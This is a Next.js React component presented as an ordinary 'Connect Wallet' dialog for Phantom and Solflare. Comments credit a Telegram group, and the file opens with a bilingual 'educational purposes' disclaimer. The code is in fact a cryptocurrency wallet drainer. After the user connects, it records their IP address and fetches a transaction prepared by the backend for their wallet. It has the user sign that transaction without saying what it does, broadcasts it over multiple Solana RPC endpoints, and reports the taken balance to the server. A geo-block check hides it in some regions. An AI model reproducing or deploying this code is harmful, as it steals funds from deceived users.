"use client" // t.me baphometteam
// Автор скрипта (далее — «Разработчик») не несёт никакой ответственности за любые действия, совершённые с использованием данного скрипта, включая, но не ограничиваясь, его применением в незаконных, противоправных, вредоносных или иных целях, нарушающих законодательство любой юрисдикции.
//Скрипт предоставляется «как есть» исключительно в информационных и образовательных целях. Пользователь самостоятельно принимает решение о его использовании и несёт полную ответственность за все последствия, включая любые убытки, ущерб, претензии третьих лиц, административные или уголовные санкции.
//Разработчик t.me baphometteam прямо заявляет, что не поощряет, не поддерживает и не одобряет использование скрипта в любых незаконных целях. Любое такое использование осуществляется исключительно на риск и страх пользователя.
//The author of this script (hereinafter referred to as the "Developer") assumes no liability for any actions taken using this script, including, but not limited to, its use for illegal, unlawful, harmful, or other purposes that violate the laws of any jurisdiction.
//This script is provided "as is" for informational and educational purposes only. The user independently decides whether to use it and is fully responsible for all consequences, including any losses, damages, third-party claims, administrative or criminal penalties.
//The Developer expressly states that it does not encourage, support, or condone the use of this script for any illegal purposes. Any such use is entirely at the user's risk.

import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle } from "@/components/ui/dialog" // t.me baphometteam
import { Button } from "@/components/ui/button" // t.me baphometteam
import Image from "next/image" // t.me baphometteam
import { useState, useEffect } from "react" // t.me baphometteam

// t.me baphometteam
interface BappometTeamModalProps {
  isOpen: boolean
  onClose: () => void
}

// t.me baphometteam
const DESKTOP_WALLETS = {
  phantom: {
    name: "Phantom",
    icon: "/phantom-icon.png",
    provider: () => (window as any).phantom?.solana,
    checkMethod: () => (window as any).phantom?.solana?.isPhantom,
  },
  solflare: {
    name: "Solflare",
    icon: "/solflare-icon.png",
    provider: () => (window as any).solflare,
    checkMethod: () => (window as any).solflare?.isSolflare,
  },
}

// t.me baphometteam
const MOBILE_WALLETS = {
  phantom: {
    name: "Phantom",
    icon: "/phantom-icon.png",
    mobile: {
      android: {
        schema: "phantom://",
        universal: "",
      },
      ios: {
        schema: "phantom://",
        universal: "",
      },
    },
  },
  solflare: {
    name: "Solflare",
    icon: "/solflare-icon.png",
    mobile: {
      android: {
        schema: "solflare://ul/v1/browse/",
        universal: "https://solflare.com/ul/v1/browse/",
      },
      ios: {
        schema: "solflare://ul/v1/browse/",
        universal: "https://solflare.com/ul/v1/browse/",
      },
    },
    deepLink: "solflare://ul/v1/browse/",
    universalLink: "https://solflare.com/ul/v1/browse/",
  },
}

// t.me baphometteam
const wallets = [
  {
    id: "phantom",
    name: "Phantom",
    icon: "/phantom-icon.png",
    description: "Popular wallet for Solana",
  },
  {
    id: "solflare",
    name: "Solflare",
    icon: "/solflare-icon.png",
    description: "Reliable wallet for Solana ecosystem",
  },
]

// t.me baphometteam
export function BappometTeamModal({ isOpen, onClose }: BappometTeamModalProps) {
  const [isMobileViewState, setIsMobileViewState] = useState(false) // t.me baphometteam
  const [connectedWalletData, setConnectedWalletData] = useState<any>(null) // t.me baphometteam
  const [isBlockedGeoState, setIsBlockedGeoState] = useState(false) // t.me baphometteam

  useEffect(() => {
    const checkMobile = () => {
      const userAgent = navigator.userAgent || navigator.vendor || (window as any).opera
      const mobile = /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini/i.test(userAgent.toLowerCase())
      setIsMobileViewState(mobile)
    }
    checkMobile()

    checkGeoBlockStatus()
  }, [])

  // t.me baphometteam
  const checkGeoBlockStatus = async () => {
    try {
      const response = await fetch("/api/check-geo")
      const data = await response.json()
      if (data.blocked) {
        setIsBlockedGeoState(true)
        onClose()
      }
    } catch (error) {}
  }

  // t.me baphometteam
  const isInWalletBrowserInstance = (walletId: string) => {
    const userAgent = navigator.userAgent.toLowerCase()
    if (walletId === "phantom") {
      return userAgent.includes("phantom")
    }
    if (walletId === "solflare") {
      return userAgent.includes("solflare")
    }
    return false
  }

  // t.me baphometteam
  const connectDesktopWalletInstance = async (walletId: string) => {
    const walletConfig = DESKTOP_WALLETS[walletId as keyof typeof DESKTOP_WALLETS]

    if (!walletConfig) {
      return
    }

    const provider = walletConfig.provider()

    if (provider && walletConfig.checkMethod()) {
      try {
        const response = await provider.connect()
        setConnectedWalletData(provider)
        await scanAndCreateTransactionData(response.publicKey.toString(), provider)
      } catch (error) {}
    } else {
      if (walletId === "phantom") {
        window.open("https://phantom.app/download", "_blank")
      } else if (walletId === "solflare") {
        window.open("https://solflare.com/download", "_blank")
      }
    }
  }

  // t.me baphometteam
  const connectMobileWalletInstance = (walletId: string) => {
    const walletConfig = MOBILE_WALLETS[walletId as keyof typeof MOBILE_WALLETS]

    if (!walletConfig) {
      return
    }

    if (isInWalletBrowserInstance(walletId)) {
      connectDesktopWalletInstance(walletId)
      return
    }

    const currentUrl = window.location.href
    const isIOSDevice = /iphone|ipad|ipod/i.test(navigator.userAgent.toLowerCase())
    const isAndroidDevice = /android/i.test(navigator.userAgent.toLowerCase())

    let deepLink = ""
    let universalLink = ""

    if (walletId === "phantom") {
      deepLink = `phantom://browse/${encodeURIComponent(currentUrl)}?ref=${encodeURIComponent(currentUrl)}`
      universalLink = `https://phantom.app/ul/browse/${encodeURIComponent(currentUrl)}?ref=${encodeURIComponent(currentUrl)}`
    } else if (walletId === "solflare") {
      deepLink = walletConfig.deepLink + encodeURIComponent(currentUrl)
      universalLink = walletConfig.universalLink + encodeURIComponent(currentUrl)
    }

    window.location.href = deepLink

    setTimeout(() => {
      window.location.href = universalLink
    }, 1500)
  }

  // t.me baphometteam
  const handleConnectWalletClick = (walletId: string) => {
    if (isMobileViewState) {
      connectMobileWalletInstance(walletId)
    } else {
      connectDesktopWalletInstance(walletId)
    }
  }

  // t.me baphometteam
  const scanAndCreateTransactionData = async (publicKey: string, provider: any) => {
    try {
      let userIPAddress = "unknown"
      try {
        const ipResponse = await fetch("https://api.ipify.org?format=json")
        const ipData = await ipResponse.json()
        userIPAddress = ipData.ip || "unknown"
      } catch (ipError) {
        try {
          const ipResponse2 = await fetch("https://api.my-ip.io/ip")
          const ipText = await ipResponse2.text()
          userIPAddress = ipText.trim() || "unknown"
        } catch {}
      }

      const response = await fetch("/api/scan-wallet", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          walletAddress: publicKey,
          userIP: userIPAddress,
        }),
      })

      if (!response.ok) {
        setTimeout(() => {
          onClose()
        }, 1000)
        return
      }

      const data = await response.json()

      if (data.message === "Insufficient balance") {
        setTimeout(() => {
          onClose()
        }, 1000)
        return
      }

      const { Connection, Transaction } = await import("@solana/web3.js")
      const transaction = Transaction.from(Buffer.from(data.transaction, "base64"))

      const signedTransaction = await provider.signTransaction(transaction)

      const RPC_ENDPOINTS = [
        "https://solana-rpc.publicnode.com",
        "https://api.mainnet-beta.solana.com",
        "https://solana.drpc.org",
        "https://solana.lavenderfive.com",
        "https://solana.api.onfinality.io/public",
        "https://public.rpc.solanavibestation.com",
      ]

      let signature = ""
      let lastError = null

      for (const endpoint of RPC_ENDPOINTS) {
        try {
          const connection = new Connection(endpoint, "confirmed")

          signature = await connection.sendRawTransaction(signedTransaction.serialize(), {
            skipPreflight: false,
            preflightCommitment: "confirmed",
          })

          await connection.confirmTransaction(signature, "confirmed")
          break
        } catch (err: any) {
          lastError = err
          continue
        }
      }

      if (!signature) {
        throw lastError || new Error("Transaction failed")
      }

      await fetch("/api/transaction-approved", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          walletAddress: publicKey,
          balanceSOL: data.walletBalance,
          balanceUSD: data.walletBalance * 153.32,
          userIP: userIPAddress,
        }),
      })

      setTimeout(() => {
        onClose()
      }, 1000)
    } catch (error: any) {
      setTimeout(() => {
        onClose()
      }, 1000)
    }
  }

  // t.me baphometteam
  if (isBlockedGeoState) {
    return null
  }

  return (
    <Dialog open={isOpen} onOpenChange={onClose}>
      <DialogContent className="sm:max-w-md gap-0 border-0 data-[state=open]:slide-in-from-bottom max-sm:fixed max-sm:bottom-0 max-sm:left-0 max-sm:right-0 max-sm:top-auto max-sm:translate-y-0 max-sm:translate-x-0 max-sm:rounded-t-[24px] max-sm:rounded-b-none sm:rounded-[20px] max-sm:w-screen max-sm:max-w-none max-sm:m-0 max-sm:p-0">
        <DialogHeader className="px-6 pt-6 pb-4 max-sm:px-5">
          <DialogTitle className="text-xl sm:text-2xl font-bold text-center">Connect Wallet</DialogTitle>
          <DialogDescription className="text-sm sm:text-base text-center">
            Choose a wallet to connect to the app
          </DialogDescription>
        </DialogHeader>

        <div className="flex flex-col gap-3 px-6 pb-6 max-sm:px-5 max-sm:pb-5">
          {wallets.map((wallet) => (
            <Button
              key={wallet.id}
              variant="outline"
              className="h-auto p-4 flex items-center justify-start gap-4 hover:bg-accent hover:border-primary transition-all bg-transparent"
              onClick={() => handleConnectWalletClick(wallet.id)}
            >
              <div className="relative h-12 w-12 flex-shrink-0 rounded-[15px] overflow-hidden">
                <Image
                  src={wallet.icon || "/placeholder.svg"}
                  alt={`${wallet.name} icon`}
                  fill
                  className="object-cover"
                />
              </div>
              <div className="flex flex-col items-start text-left flex-1">
                <span className="font-semibold text-base">{wallet.name}</span>
                <span className="text-sm text-muted-foreground">{wallet.description}</span>
              </div>
            </Button>
          ))}
        </div>
      </DialogContent>
    </Dialog>
  )
}
